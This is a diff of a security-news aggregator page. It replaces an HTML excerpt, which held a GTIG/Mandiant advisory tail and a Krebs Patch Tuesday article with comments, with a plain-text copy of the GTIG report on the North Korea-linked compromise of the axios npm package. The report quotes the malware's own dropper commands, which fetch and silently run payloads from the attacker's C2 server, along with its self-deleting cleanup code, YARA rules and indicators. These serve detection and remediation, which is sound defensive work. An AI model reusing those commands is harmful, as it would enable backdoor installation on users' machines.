-<p><span style="vertical-align: baseline;">N/A </span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><span style="vertical-align: baseline;">plain-crypto-js-4.2.1.tgz</span></p>
-</td>
-<td style="vertical-align: middle; border: 1px solid #000000; padding: 16px;">
-<p><code style="vertical-align: baseline;">58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668</code></p>
-</td>
-</tr>
-</tbody>
-</table></div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div></div>
-<div class="block-paragraph_advanced"><h4>YARA Rules</h4>
-<p><span style="vertical-align: baseline;">These rules may be most useful on developer workstations, CI/build systems, and other suspected impacted hosts for retrospective hunting and validation.</span></p></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code>rule G_Backdoor_WAVESHAPER.V2_PS_1
+            <div class="content-text">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack
+Google Threat Intelligence Group
+Mandiant
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Written by: Austin Larsen, Dima Lenz, Adrian Hernandez, Tyler McLellan, Christopher Gardner, Ashley Zaya, Michael Rudden, Mon Liclican, Muhammad Umair
+Introduction
+Google Threat Intelligence Group (GTIG) is tracking an active software supply chain attack targeting the popular Node Package Manager (NPM) package "[axios](https://www.npmjs.com/package/axios)." Between March 31, 2026, 00:21 and 03:20 UTC, an attacker introduced a malicious dependency named "plain-crypto-js
+" into axios NPM releases versions 1.14.1 and 0.30.4. Axios is the most popular JavaScript library used to simplify HTTP requests, and these packages typically have over 100 million and 83 million weekly downloads, respectively. This malicious dependency is an obfuscated dropper that deploys the WAVESHAPER.V2 backdoor across Windows, macOS, and Linux.
+GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since at least 2018, based on the use of WAVESHAPER.V2, an updated version of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering) previously used by this threat actor. Further, analysis of infrastructure artifacts used in this attack shows overlaps with infrastructure used by UNC1069 in past activities.
+This blog details the attack lifecycle, from the initial account compromise to the deployment of operating system (OS)-specific payloads, and provides actionable guidance for defenders to identify and mitigate this threat.
+Campaign Overview
+On March 31, 2026, GTIG observed the introduction of plain-crypto-js
+version 4.2.1 as a dependency in the legitimate axios
+package version 1.14.1. Analysis indicates the maintainer account associated with the axios
+package was compromised, with the associated email address changed to an attacker-controlled account (ifstap@proton.me
+).
+The threat actor used the postinstall
+hook within the "package.json"
+file of the malicious dependency to achieve silent execution. Upon installation of the compromised axios
+package, NPM automatically executes an obfuscated JavaScript dropper named "setup.js"
+in the background.
+"scripts": {
+"test": "echo \"Error: no test specified\" && exit 1",
+"postinstall": "node setup.js"
+}
+Malware Analysis
+The plain-crypto-js
+package serves as a payload delivery vehicle. The core component, SILKBELL, setup.js
+(SHA256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
+), dynamically checks the target system's operating system upon execution to deliver platform-specific payloads.
+The script uses a custom XOR and Base64-based string obfuscation routine to conceal the command-and-control (C2 or C&C) URL and host OS execution commands. To evade static analysis, it dynamically loads fs
+, os
+, and execSync
+. After successfully dropping the secondary payload, setup.js
+attempts to delete itself and revert the modified package.json
+to hide forensic traces of the postinstall
+hook.
+Operating System-Specific Execution Paths
+Depending on the identified platform, the dropper executes the following routines.
+Windows
+The dropper actively hunts for the native powershell.exe
+binary. To evade detection, it copies the legitimate executable to %PROGRAMDATA%\wt.exe
+. It then downloads a PowerShell script via curl
+using the POST body packages.npm.org/product1
+and saves it to the user's AppData Temp directory (e.g., %TEMP%\6202033.ps1
+). The payload is executed using a copied Windows Terminal executable with hidden and execution policy bypass flags.
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033 > %TEMP%\6202033.ps1
+& %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1 http://sfrclak[.]com:8000/6202033 & del ""PS_PATH"" /f", 0, False
+macOS
+The malware uses bash
+and curl
+to download a native Mach-O binary payload to /Library/Caches/com.apple.act.mond
+using the POST body packages.npm.org/product0
+. It modifies permissions to make the file executable and launches it via zsh
+in the background.
+try
+do shell script "
+curl -o /Library/Caches/com.apple.act.mond
+-d packages.npm.org/product0
+-s http://sfrclak.com:8000/6202033
+&& chmod 770 /Library/Caches/com.apple.act.mond
+&& /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &"
+&> /dev/null"
+"
+end try
+do shell script "rm -rf tmp/6202033"
+Linux
+The script downloads a Python backdoor to /tmp/ld.py
+using the POST body packages.npm.org/product2
+.
+Cleanup
+Aside from removing downloaded scripts in two execution branches, the script attempts to remove itself and replace an injected package.json with an original one, which was stored as "package.md
+".
+const K = __filename;
+t.unlink(K, (x => {}))
+t.unlink('package.json', (x => {})), t.rename('package.md', 'package.json', ord)
+WAVESHAPER.V2 Backdoor Capabilities
+The platform-specific payloads ultimately deploy variants of a backdoor tracked by GTIG as WAVESHAPER.V2, a backdoor written in C++ that targets macOS to collect system information, enumerate directories, or execute additional payloads and that connects to the C2 provided via command-line arguments. Notably, GTIG identified additional variants of WAVESHAPER.V2 written in PowerShell and Python to target diverse environments. Regardless of the operating system, the malware beacons to the C2 endpoint over port 8000 at 60-second intervals. The beacon consists of Base64-encoded JSON data and uses a hard-coded User-Agent:
+mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)
+Following the initial beaconing to the adversary infrastructure, WAVESHAPER.V2 continuously polls, pausing for 60 seconds awaiting instructions. The server response determines the next action taken by the implant. The backdoor supports multiple commands outlined in the Table 1.
+On Windows, persistence is achieved by creating a hidden batch file (%PROGRAMDATA%\system.bat
+) and adding a new entry named MicrosoftUpdate
+to HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+to launch it at logon.
+WAVESHAPER.V2 acts as a fully functional RAT with the following capabilities:
+-
+Reconnaissance: Extracts system telemetry, including hostname, username, boot time, time zone, OS version, and detailed running process lists.
+-
+Command Execution: Supports multiple execution methods, including in-memory Portable Executable (PE) injection and arbitrary shell commands. The shell execution command expects a script and script parameters from C2; if no script is provided, the parameter is executed as a PowerShell command, but if a script is provided, it is either Base64-encoded or placed into a file depending on its size.
+-
+File System Enumeration: Returns detailed metadata for requested target directories by continuously recursing through the file system.
+Attribution
+GTIG attributes this activity to [UNC1069](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a financially motivated North Korea-nexus threat actor active since 2018. Analysis of the C2 infrastructure (sfrclak[.]com
+resolving to 142.11.206.73
+) revealed connections from a specific AstrillVPN node previously used by UNC1069. Additionally, adjacent infrastructure hosted on the same ASN has been historically linked to UNC1069 operations.
+Furthermore, WAVESHAPER.V2 is a direct evolution of [WAVESHAPER](https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering), a macOS and Linux backdoor previously attributed to UNC1069. While the original WAVESHAPER uses a lightweight, raw binary C2 protocol and employs code packing, WAVESHAPER.V2 communicates using JSON, collects additional system information, and supports more backdoor commands. Despite these upgrades, both versions accept their C2 URL dynamically via command-line arguments, share identical C2 polling behaviors and an uncommon User-Agent string, and deploy secondary payloads to identical temporary directories (e.g., /Library/Caches/com.apple.act.mond
+).
+Outlook and Implications
+The impact of this attack by North Korea-nexus actors is broad and has ripple effects as other popular packages rely on axios as a dependency. Notably, UNC1069 isn’t the only threat actor that has launched successful open source supply chain attacks in recent weeks. UNC6780 (also known as TeamPCP) recently poisoned GitHub Actions and PyPI packages associated with projects like Trivy, Checkmarx, and LiteLLM to deploy the SANDCLOCK credential stealer and facilitate follow-on extortion operations.
+Hundreds of thousands of stolen secrets could potentially be circulating as a result of these recent attacks. This could enable further software supply chain attacks, software as a service (SaaS) environment compromises (leading to downstream customer compromises), ransomware and extortion events, and cryptocurrency theft over the near term.
+Supply chain compromise is a particularly dangerous tactic because it abuses the inherent trust that users and enterprise administrators place in hardware, software, and updates supplied by reputable vendors as well as the trust they may not realize they are placing in collaborative code-sharing communities. Defenders should pay close attention to these campaigns, and enterprises should initiate dedicated efforts to assess the existing impact, remediate compromised systems, and harden environments against future attacks.
+Remediation
+GTIG urges all developers and organizations using the axios package to take immediate corrective action. Priority should be given to auditing dependency trees for compromised versions, isolating affected hosts, and rotating any potentially exposed secrets or credentials. Following initial containment, organizations must implement long-term hardening through strict version pinning and enhanced supply-chain monitoring.
+-
+Version Control: Do not upgrade to axios version 1.14.1 or 0.30.4. Ensure corporate-managed NPM repositories are configured to serve only known-good versions (e.g., 1.14.0 or earlier; 0.30.3 or earlier).
+-
+Dependency Pinning: Pin axios to a known safe version in your
+package-lock.json
+to prevent accidental upgrades. -
+Malicious Package Audit: Inspect project lockfiles specifically for the 'plain-crypto-js' package (versions 4.2.0 or 4.2.1). Use tools like
+[Wiz](https://wiz.io)or[Open Source Insights](https://deps.dev/)for deeper dependency auditing. -
+Pipeline Security: Pause CI/CD deployments for any package relying on axios. Validate that builds are not pulling "latest" versions before redeploying with pinned, safe versions.
+-
+Incident Response: If
+plain-crypto-js
+is detected, assume the host environment is compromised. Revert the environment to a known-good state and rotate all credentials or secrets present on that machine. -
+Network Defense: Block all traffic to sfrclak[.]com and the command & control IP: 142.11.206.73. Monitor and alert on any endpoint communication attempts to this domain.
+-
+Cache Remediation: Clear local and shared npm, yarn, and pnpm caches on all workstations and build servers to prevent re-infection during subsequent installs.
+-
+Endpoint Protection: Deploy EDR to protect developer environments. Monitor for suspicious processes spawning from Node.js applications that match known Indicators of Compromise (IOCs).
+-
+Credential Management: Rotate all tokens and API keys used by applications confirmed to have run indicators of compromise (IOCs).
+- Developer Sandboxing & Secret Vaulting: Isolate development environments in containers or sandboxes to restrict host filesystem access, and migrate plaintext secrets to the OS keychain using
+[aws-vault](https://github.com/ByteNess/aws-vault?tab=readme-ov-file). This ensures compromised packages cannot programmatically scrape credentials or execute malicious scripts directly on the host machine.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying the activity outlined in this blog post, we have included IOCs in a free [GTI Collection](https://www.virustotal.com/gui/collection/c5adea0fa8aac14e6aabd8d3d4a1d19e4cd0eb76e679f2e9d3fed2a3170c09bb/summary) for registered users.
+Network Indicators
+File Indicators
+YARA Rules
+These rules may be most useful on developer workstations, CI/build systems, and other suspected impacted hosts for retrospective hunting and validation.
+rule G_Backdoor_WAVESHAPER.V2_PS_1
 {
-    meta:
-        description = "Detects the WAVESHAPER.V2 PowerShell backdoor which communicates with C2 via base64 encoded JSON beacons and supports PE injection and script execution"
-        author = "GTIG"
-        md5 = "04e3073b3cd5c5bfcde6f575ecf6e8c1"
-        date_created = "2026/03/31"
-        date_modified = "2026/03/31"
-        rev = 1
-        platforms = "Windows"
-        family = "WAVESHAPER.V2"
-    strings:
-        $ss1 = "packages.npm.org/product1" ascii wide nocase
-        $ss2 = "Extension.SubRoutine" ascii wide nocase
-        $ss3 = "rsp_peinject" ascii wide nocase
-        $ss4 = "rsp_runscript" ascii wide nocase
-        $ss5 = "rsp_rundir" ascii wide nocase
-        $ss6 = "Init-Dir-Info" ascii wide nocase
-        $ss7 = "Do-Action-Ijt" ascii wide nocase
-        $ss8 = "Do-Action-Scpt" ascii wide nocase
-    condition:
-        uint16(0) != 0x5A4D and filesize &lt; 100KB and 5 of ($ss*)
-}</code></pre></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code>rule G_Hunting_Downloader_suspected_UNC1069_PS_1
+meta:
+description = "Detects the WAVESHAPER.V2 PowerShell backdoor which communicates with C2 via base64 encoded JSON beacons and supports PE injection and script execution"
+author = "GTIG"
+md5 = "04e3073b3cd5c5bfcde6f575ecf6e8c1"
+date_created = "2026/03/31"
+date_modified = "2026/03/31"
+rev = 1
+platforms = "Windows"
+family = "WAVESHAPER.V2"
+strings:
+$ss1 = "packages.npm.org/product1" ascii wide nocase
+$ss2 = "Extension.SubRoutine" ascii wide nocase
+$ss3 = "rsp_peinject" ascii wide nocase
+$ss4 = "rsp_runscript" ascii wide nocase
+$ss5 = "rsp_rundir" ascii wide nocase
+$ss6 = "Init-Dir-Info" ascii wide nocase
+$ss7 = "Do-Action-Ijt" ascii wide nocase
+$ss8 = "Do-Action-Scpt" ascii wide nocase
+condition:
+uint16(0) != 0x5A4D and filesize < 100KB and 5 of ($ss*)
+}
+rule G_Hunting_Downloader_suspected_UNC1069_PS_1
 {
-    meta:
-        description = "Detects PowerShell dropper associated with suspected UNC1069 and Axios npm package supply chain attack. Associated to WAVESHAPER.V2"
-        author = "GTIG"
-        md5 = "089e2872016f75a5223b5e02c184dfec"
-        date_created = "2026/03/31"
-        date_modified = "2026/03/31" 
-        rev = 1
-        platforms = "Windows"
-    strings:
-        $ss1 = "start /min powershell -w h" ascii wide nocase
-        $ss2 = "[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString" ascii wide nocase
-        $ss3 = "Invoke-WebRequest -UseBasicParsing" ascii wide nocase
-        $ss4 = "-Method POST -Body" ascii wide nocase
-        $ss5 = "packages.npm.org/product1" ascii wide nocase
-    condition:
-        uint16(0) != 0x5A4D and filesize &lt; 5KB and all of them
-}</code></pre></div>
-<div class="block-paragraph_advanced"><pre class="language-plain"><code>rule G_Hunting_Downloader_SILKBELL_1
+meta:
+description = "Detects PowerShell dropper associated with suspected UNC1069 and Axios npm package supply chain attack. Associated to WAVESHAPER.V2"
+author = "GTIG"
+md5 = "089e2872016f75a5223b5e02c184dfec"
+date_created = "2026/03/31"
+date_modified = "2026/03/31"
+rev = 1
+platforms = "Windows"
+strings:
+$ss1 = "start /min powershell -w h" ascii wide nocase
+$ss2 = "[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString" ascii wide nocase
+$ss3 = "Invoke-WebRequest -UseBasicParsing" ascii wide nocase
+$ss4 = "-Method POST -Body" ascii wide nocase
+$ss5 = "packages.npm.org/product1" ascii wide nocase
+condition:
+uint16(0) != 0x5A4D and filesize < 5KB and all of them
+}
+rule G_Hunting_Downloader_SILKBELL_1
 {
-    meta:
-        description = "Detects the obfuscated version of the JS NPM supply chain downloader using Base64 obfuscation and custom XOR. Associated with WAVESHAPER.V2"
-        author = "GTIG"
-        md5 = "7658962ae060a222c0058cd4e979bfa1"
-        date_created = "2026/03/31"
-        date_modified = "2026/03/31" 
-        rev = 1
-        platforms = "Any"
-    strings:
-        $ss1 = "OrDeR_7077" ascii wide fullword
-        $ss2 = "String.fromCharCode(S^a^333)" ascii wide
-        $ss3 = "\"TE9DQUw^\".replaceAll(\"^\",\"=\")" ascii wide
-        $ss4 = "\"UFM_\".replaceAll(\"_\",\"=\")" ascii wide
-        $ss5 = "\"U0NSXw--\".replaceAll(\"-\",\"=\")" ascii wide
-        $ss6 = "\"UFNfQg--\".replaceAll(\"-\",\"=\")" ascii wide
-        $ss7 = "\"d2hlcmUgcG93ZXJzaGVsbA((\".replaceAll(\"(\",\"=\")" ascii wide
-    condition:
-        uint16(0) != 0x5A4D and filesize &lt; 100KB and all of them
-}</code></pre></div>
-<div class="block-paragraph_advanced"><h3><span style="vertical-align: baseline;">Google Security Operations (SecOps)</span></h3>
-<p><span style="vertical-align: baseline;">Google Security Operations (SecOps) customers have access to the following broad category rules and more under the Mandiant Intel Emerging Threats rule pack.</span></p>
-<ul>
-<li style="vertical-align: baseline;">
-<p><span style="vertical-align: baseline;">Curl Writing Apple System File to Staging Directory</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><span style="vertical-align: baseline;">Node Spawning Nohup Osascript</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><span style="vertical-align: baseline;">Node Spawning Windows Script Host With Delete Command</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><span style="vertical-align: baseline;">Windows Script Host Spawning Shell With Curl</span></p>
-</li>
-<li style="vertical-align: baseline;">
-<p><span style="vertical-align: baseline;">Windows Terminal In Suspicious Staging Directory</span></p>
-</li>
-</ul>
-<h3><span style="vertical-align: baseline;">Wiz</span></h3>
-<p><span style="vertical-align: baseline;">Wiz customers should check their Wiz Threat Center for information on this advisory and whether or not they are impacted. For more information refer to Wiz’s blog post, </span><a href="https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack" rel="noopener" target="_blank"><span style="text-decoration: underline; vertical-align: baseline;">Axios NPM Distribution Compromised in Supply Chain Attack</span></a>.</p></div>
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-9" class="article-body">
-            <h2 class="article-title">Microsoft Patch Tuesday, March 2026 Edition</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/microsoft-patch-tuesday-march-2026-edition/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft Corp. today pushed security updates to fix at least 77 vulnerabilities in its Windows operating systems and other software. There are no pressing “zero-day” flaws this month (compared to February’s five zero-day treat), but as usual some patches may deserve more rapid attention from organizations using Windows. Here are a few highlights from this month’s Patch Tuesday.
-Two of the bugs Microsoft patched today were publicly disclosed previously. [CVE-2026-21262](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21262) is a weakness that allows an attacker to elevate their privileges on SQL Server 2016 and later editions.
-“This isn’t just any elevation of privilege vulnerability, either; the advisory notes that an authorized attacker can elevate privileges to sysadmin over a network,” Rapid7’s Adam Barnett said. “The CVSS v3 base score of 8.8 is just below the threshold for critical severity, since low-level privileges are required. It would be a courageous defender who shrugged and deferred the patches for this one.”
-The other publicly disclosed flaw is [CVE-2026-26127](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26127), a vulnerability in applications running on .NET. Barnett said the immediate impact of exploitation is likely limited to denial of service by triggering a crash, with the potential for other types of attacks during a service reboot.
-It would hardly be a proper Patch Tuesday without at least one critical Microsoft Office exploit, and this month doesn’t disappoint. [CVE-2026-26113](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26113) and [CVE-2026-26110](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-26110) are both remote code execution flaws that can be triggered just by viewing a booby-trapped message in the Preview Pane.
-Satnam Narang at Tenable notes that just over half (55%) of all Patch Tuesday CVEs this month are privilege escalation bugs, and of those, a half dozen were rated “exploitation more likely” — across Windows Graphics Component, Windows Accessibility Infrastructure, Windows Kernel, Windows SMB Server and Winlogon. These include:
-–[CVE-2026-24291](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24291): Incorrect permission assignments within the Windows Accessibility Infrastructure to reach SYSTEM (CVSS 7.8)
-–[CVE-2026-24294](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24294): Improper authentication in the core SMB component (CVSS 7.8)
-–[CVE-2026-24289](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-24289): High-severity memory corruption and race condition flaw (CVSS 7.8)
-–[CVE-2026-25187](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-25187): Winlogon process weakness discovered by Google Project Zero (CVSS 7.8).
-Ben McCarthy, lead cyber security engineer at Immersive, called attention to [CVE-2026-21536](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-21536), a critical remote code execution bug in a component called the Microsoft Devices Pricing Program. Microsoft has already resolved the issue on their end, and fixing it requires no action on the part of Windows users. But McCarthy says it’s notable as one of the first vulnerabilities identified by an AI agent and officially recognized with a CVE attributed to the Windows operating system. It was discovered by XBOW, a fully autonomous AI penetration testing agent.
-XBOW has consistently ranked at or near the top of the Hacker One bug bounty leaderboard for the past year. McCarthy said CVE-2026-21536 demonstrates how AI agents can identify critical 9.8-rated vulnerabilities without access to source code.
-“Although Microsoft has already patched and mitigated the vulnerability, it highlights a shift toward AI-driven discovery of complex vulnerabilities at increasing speed,” McCarthy said. “This development suggests AI-assisted vulnerability research will play a growing role in the security landscape.”
-Microsoft earlier provided patches to address nine browser vulnerabilities, which are not included in the Patch Tuesday count above. In addition, Microsoft issued a crucial out-of-band (emergency) [update on March 2](https://support.microsoft.com/en-us/topic/march-2-2026-kb5082314-os-build-20348-4776-out-of-band-606518e5-28d2-4ebe-be25-26287e2fc703) for Windows Server 2022 to address a certificate renewal issue with passwordless authentication technology Windows Hello for Business.
-Separately, Adobe shipped updates to fix 80 vulnerabilities — some of them critical in severity — in [a variety of products](https://helpx.adobe.com/security/Home.html), including Acrobat and Adobe Commerce. Mozilla Firefox v. 148.0.2 resolves three high severity CVEs.
-For a complete breakdown of all the patches Microsoft released today, check out the SANS Internet Storm Center’s [Patch Tuesday post](https://isc.sans.edu/forums/diary/Microsoft%20Patch%20Tuesday%20March%202026/32782/). Windows enterprise admins who wish to stay abreast of any news about problematic updates, [AskWoody.com](https://www.askwoody.com) is always worth a visit. Please feel free to drop a comment below if you experience any issues apply this month’s patches.
-Contrary to this article, updates this month contain fixes for at least two publicly acknowledged zero days.
-Really? Which two? IDK how you define zero-day, but for me it’s an unpatched and actively exploited vulnerability. As mentioned in the story, there were two flaws fixed this month that were previously disclosed publicly. I believe in both cases there was not even sample exploit code involved.
-I’m just going off every other news outlet reporting. Bleeping computer, for example, stated “This month’s Patch Tuesday fixes two publicly disclosed zero-day vulnerabilities, with none of them known to be exploited in attacks. Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited while no official fix is available.” ¯\_(ツ)_/¯
-Okay. Thanks for pointing that out. I wonder why Microsoft would call it zero-day when they’re not aware of exploitation; doesn’t seem to suit their interests to do so. I’ve always believed that calling bugs 0day just because someone detailed a vulnerability (without providing examples of how to exploit them) publicly is unnecessarily alarmist. Real zero-days are a call for greater urgency, IMHO.
-I think Microsoft likes to call them zero day when they feel the exploit is available even though nobody is currently using it. But then again maybe Microsoft knows something nobody else does? Is it one of those deals where it depends on who is releasing these security descriptors for the updates? One person calls them zero day the other something less dire? I saw the Bleeping Computer release too. They said the 2 zero-day ones were publicly disclosed. Not actively exploited. I guess sort of splitting hairs there.
-That sounds pretty accurate. I think “zero-day” is defined and communicated differently throughout different organizations. Technically, a zero-day is any vulnerability that was unknown to the vendor before it became public. That doesn’t necessarily mean it’s being actively exploited. Microsoft uses “zero-day” as a broad label, then clarifies whether it’s actively exploited or just publicly disclosed. Other sources, like BleepingComputer, tend to separate those more clearly, which can make things less confusing. A publicly disclosed zero-day increases risk, but an actively exploited one is far more urgent since attackers are already using it in real-world attacks.
-I don’t know if they know what they’re talking about, but Lifehacker reported there are two:
-https://lifehacker.com/tech/microsoft-patch-tuesday-march-2026#:~:text=Two%20publicly%20disclosed%20zero%2Ddays%20for%20this%20Patch%20Tuesday
-Looking for a patch for the chicken parm with panko and tagliatelle exploit. It’s two cascaded exploits, both leading to escalation followed by a ring three rk installation. 2021-2023/early 2024. Originating attacker from Ramat Gan.
-Gnarly beach.
-I had the same discussion with my coworker, who used CoPilot to summarize and the previously disclosed findings were included in the response because the patch is included in this month’s bundle. Strictly speaking anything previously published is no longer a “zero day” as far as I know, but it’s genesis stays with it.
-I mean, any bug, prior to being disclosed, is at some point a ‘zero-day’ bug. AFAIK, it ceases being an 0-day the minute it is disclosed, yah?
-Have they heard about two-factor authentication? They were obviously phished. Maybe put TFA in place now.
-Lol at the roughy in your article! You criminal mastermind, Keir!
-Keep a close eye on that .NET vulnerability (CVE-2026-26127). If a machine crashes hard mid-update, it frequently corrupts the Master File Table. We always see a spike in ‘RAW’ or unbootable drives right after Patch Tuesday rollups go sideways. If you end up with an inaccessible drive this week, don’t immediately wipe it. Run a block-level scan with a tool like Stellar Data Recovery first, it bypasses the scrambled partition table to pull the raw files, which are almost always still intact.</div>
+meta:
+description = "Detects the obfuscated version of the JS NPM supply chain downloader using Base64 obfuscation and custom XOR. Associated with WAVESHAPER.V2"
+author = "GTIG"
+md5 = "7658962ae060a222c0058cd4e979bfa1"
+date_created = "2026/03/31"
+date_modified = "2026/03/31"
+rev = 1
+platforms = "Any"
+strings:
+$ss1 = "OrDeR_7077" ascii wide fullword
+$ss2 = "String.fromCharCode(S^a^333)" ascii wide
+$ss3 = "\"TE9DQUw^\".replaceAll(\"^\",\"=\")" ascii wide
+$ss4 = "\"UFM_\".replaceAll(\"_\",\"=\")" ascii wide
+$ss5 = "\"U0NSXw--\".replaceAll(\"-\",\"=\")" ascii wide
+$ss6 = "\"UFNfQg--\".replaceAll(\"-\",\"=\")" ascii wide
+$ss7 = "\"d2hlcmUgcG93ZXJzaGVsbA((\".replaceAll(\"(\",\"=\")" ascii wide
+condition:
+uint16(0) != 0x5A4D and filesize < 100KB and all of them
+}
+Google Security Operations (SecOps)
+Google Security Operations (SecOps) customers have access to the following broad category rules and more under the Mandiant Intel Emerging Threats rule pack.
+-
+Curl Writing Apple System File to Staging Directory
+-
+Node Spawning Nohup Osascript
+-
+Node Spawning Windows Script Host With Delete Command
+-
+Windows Script Host Spawning Shell With Curl
+-
+Windows Terminal In Suspicious Staging Directory
+Wiz
+Wiz customers should check their Wiz Threat Center for information on this advisory and whether or not they are impacted. For more information refer to Wiz’s blog post, [Axios NPM Distribution Compromised in Supply Chain Attack](https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack).</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
